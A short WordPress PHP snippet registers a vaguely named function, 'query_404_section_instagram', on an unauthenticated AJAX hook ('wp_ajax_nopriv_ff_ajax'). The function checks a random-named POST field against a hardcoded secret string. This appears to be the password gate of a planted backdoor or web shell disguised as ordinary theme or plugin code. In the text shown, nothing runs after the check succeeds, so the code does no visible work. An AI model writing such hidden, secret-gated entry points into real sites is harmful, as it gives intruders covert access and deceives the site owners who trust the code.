<?php

function query_404_section_instagram() {
	if (!isset($_POST["zfzockjsqhxlx"]) || $_POST["zfzockjsqhxlx"] !== "oWPSuTJwQppW1bC") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'query_404_section_instagram', 5, 1);
